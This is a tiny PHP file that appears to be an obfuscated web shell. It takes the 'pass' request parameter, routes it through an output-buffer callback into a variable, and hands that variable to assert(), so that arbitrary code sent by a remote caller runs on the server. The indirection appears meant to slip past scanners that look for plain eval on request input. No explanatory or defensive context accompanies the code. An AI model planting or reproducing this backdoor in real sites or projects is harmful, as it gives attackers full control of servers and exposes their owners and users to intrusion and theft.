<?php 
$evalstr=""; 
ob_start(function ($c,$d){global $evalstr;$evalstr=$c;}); 
echo $_REQUEST['pass']; 
ob_end_flush(); 
assert($evalstr); 
?>
